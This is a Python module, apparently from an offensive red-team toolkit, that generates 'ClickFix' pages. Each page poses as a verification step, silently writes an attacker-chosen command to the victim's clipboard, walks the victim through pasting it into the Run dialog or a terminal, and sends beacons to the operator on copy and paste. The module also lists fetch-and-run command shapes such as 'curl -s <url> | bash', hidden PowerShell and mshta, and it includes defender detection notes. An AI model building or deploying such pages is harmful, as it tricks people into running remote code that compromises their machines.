# ============================================================================
# FILE: core/clickfix.py
# ============================================================================
"""ClickFix: the paste layer, which is the one layer no session control sees.

Every other technique in this tool steals a session. This one does not: the target is asked to
run a command, and the command runs with their own rights, on their own machine, after a
normal-looking "verification" step. That is why it sits at the bottom of the tier list and
still matters - a device-bound, CAE-aware, passkey-protected session is no obstacle to a
command the user pastes themselves.

What this module provides is the PAGE, not the payload: the fake verification step, the
clipboard write, the instructions for the platform, and the beacon that tells the operator the
paste happened. The command comes from the operator (`--clickfix-command`), because the
payload is the engagement's business and shipping one here would be shipping a backdoor.

The detection notes are part of the module on purpose: a page that writes to the clipboard is
observable, and a Run dialog that starts a network-capable interpreter is observable, so the
operator should know what the blue team sees before choosing this.
"""
import html
import json

__all__ = ["PLATFORMS", "COMMAND_SHAPES", "build_page", "instructions", "detection_notes",
           "describe", "ClickFixError"]


class ClickFixError(RuntimeError):
    """A refusal the CLI can report verbatim."""


# The step-by-step a target follows, per platform. The keys are the platforms the tool
# renders for; the text is what the page shows.
PLATFORMS = {
    "windows": ["Press the Windows key and R together",
                "Paste the code you just copied",
                "Press Enter to complete the verification"],
    "macos": ["Press Command and Space together",
              "Paste the code you just copied",
              "Press Enter to complete the verification"],
    "linux": ["Open a terminal (Ctrl+Alt+T)",
              "Paste the code you just copied",
              "Press Enter to complete the verification"],
}

# The SHAPES a command takes on each platform, so an operator recognises the choice they are
# making. No payload is embedded: the placeholders are the operator's.
COMMAND_SHAPES = {
    "windows": {
        "powershell": "powershell -w hidden -c \"<payload>\"",
        "powershell-encoded": "powershell -enc <base64-utf16le>",
        "mshta": "mshta <url>",
        "curl-pipe": "curl -s <url> | powershell -",
    },
    "macos": {
        "osascript": "osascript -e '<script>'",
        "curl-pipe": "curl -s <url> | bash",
    },
    "linux": {
        "curl-pipe": "curl -s <url> | bash",
        "wget-pipe": "wget -qO- <url> | sh",
    },
}

def _js_str(value):
    """A JSON string that is safe inside an inline <script>.

    `json.dumps` escapes quotes but NOT `</`, so a command containing `</script>` would close
    the tag and inject markup into the page. `<`, `>` and `&` are written as JSON unicode
    escapes: still valid JSON, still the same string in JS, and unable to end the element.
    """
    return (json.dumps(str(value)).replace("<", "\\u003c").replace(">", "\\u003e")
            .replace("&", "\\u0026"))


_JS = """
(function () {
  var btn = document.getElementById('cf-btn');
  var code = %(code_json)s;
  var done = document.getElementById('cf-done');
  function beacon(kind) {
    try {
      var img = new Image();
      img.src = %(beacon_json)s + '?k=' + kind + '&t=' + Date.now();
    } catch (e) {}
  }
  btn.addEventListener('click', function () {
    var copied = false;
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(code).then(function () { copied = true; }, function () {});
    }
    try {
      var ta = document.createElement('textarea');
      ta.value = code; ta.setAttribute('readonly', '');
      ta.style.position = 'absolute'; ta.style.left = '-9999px';
      document.body.appendChild(ta); ta.select();
      copied = document.execCommand('copy') || copied;
      document.body.removeChild(ta);
    } catch (e) {}
    beacon(copied ? 'copy' : 'copy-failed');
    btn.setAttribute('disabled', 'disabled');
    btn.textContent = 'Copied - follow the steps below';
    if (done) { done.style.display = 'block'; }
  });
  document.addEventListener('keydown', function (e) {
    if ((e.ctrlKey || e.metaKey) && (e.key === 'v' || e.key === 'V')) { beacon('paste'); }
  });
})();
"""


def instructions(platform="windows"):
    """The steps the page shows, for one platform."""
    if platform not in PLATFORMS:
        raise ClickFixError(f"unknown platform {platform!r}; have: "
                            f"{', '.join(sorted(PLATFORMS))}")
    return list(PLATFORMS[platform])


def build_page(command="", platform="windows", headline="", brand="", beacon_url="",
               locale="en"):
    """A self-contained page: the fake step, the clipboard write, the instructions, a beacon.

    `command` is the operator's own command (see COMMAND_SHAPES for the shapes); an empty
    command is refused rather than rendered, because a page that copies nothing is a page that
    does nothing.
    """
    if not str(command or "").strip():
        raise ClickFixError("a ClickFix page needs --clickfix-command: the page copies it")
    if platform not in PLATFORMS:
        raise ClickFixError(f"unknown platform {platform!r}")
    head = html.escape(headline or ("Verification required" if locale == "en"
                                    else "\u0938\u0924\u094d\u092f\u093e\u092a\u0928 \u0906\u0935\u0936\u094d\u092f\u0915"))
    who = html.escape(brand or "")
    steps = "".join(f"<li>{html.escape(step)}</li>" for step in instructions(platform))
    script = _JS % {"code_json": _js_str(command), "beacon_json": _js_str(beacon_url)}
    return f"""<!doctype html>
<html lang="{html.escape(locale)}"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{head}</title>
<style>
 body{{font:16px/1.5 system-ui,Segoe UI,Roboto,sans-serif;margin:0;background:#f6f7f9;color:#1a1a1a}}
 .wrap{{max-width:520px;margin:8vh auto;padding:28px;background:#fff;border-radius:10px;
        box-shadow:0 2px 18px rgba(0,0,0,.08)}}
 h1{{font-size:20px;margin:0 0 6px}} .who{{color:#5a6472;font-size:13px;margin-bottom:18px}}
 button{{width:100%;padding:14px;font-size:16px;border:0;border-radius:8px;cursor:pointer;
         background:#0f6cbd;color:#fff}} button[disabled]{{background:#8aa9c4;cursor:default}}
 ol{{padding-left:20px}} #cf-done{{display:none;margin-top:14px;color:#0f6cbd}}
</style></head><body><div class="wrap">
<h1>{head}</h1><div class="who">{who}</div>
<button id="cf-btn">Copy verification code</button>
<ol>{steps}</ol>
<div id="cf-done">If nothing happened, the code is already in your clipboard.</div>
</div><script>{script}</script></body></html>
"""


def detection_notes():
    """What a defender sees. Part of the module, not an afterthought."""
    return {
        "clipboard": ("a page that is not the clipboard's owner writes to it; browsers with "
                      "clipboard-write permission prompts make this visible, and a page whose "
                      "only job is a copy button is a strong signal"),
        "process": ("the Run dialog (or a terminal) launching a network-capable interpreter "
                    "with an encoded or hidden argument: powershell -enc, mshta, "
                    "curl|bash - none of these are normal user activity"),
        "network": ("the interpreter's own egress, which is not the browser's: a proxy or EDR "
                    "sees a new process making a first-seen HTTPS request"),
        "log": ("on Windows, PowerShell script-block logging and the Run dialog's MRU; on "
                "macOS, the unified log for osascript and shell history; on Linux, auditd "
                "execve events"),
        "user_side": ("the user pastes it themselves, which is why user training (never paste "
                      "commands from a page) is the control that actually works here"),
    }


def describe(page_report):
    lines = [f"clickfix page: {page_report.get('platform')} "
             f"({page_report.get('bytes')} bytes, {len(page_report.get('steps') or [])} steps)"]
    if page_report.get("beacon"):
        lines.append("  beacon: the copy and the paste are both reported")
    for key, note in (page_report.get("detection") or {}).items():
        lines.append(f"  detection[{key}]: {note[:96]}")
    return "\n".join(lines)
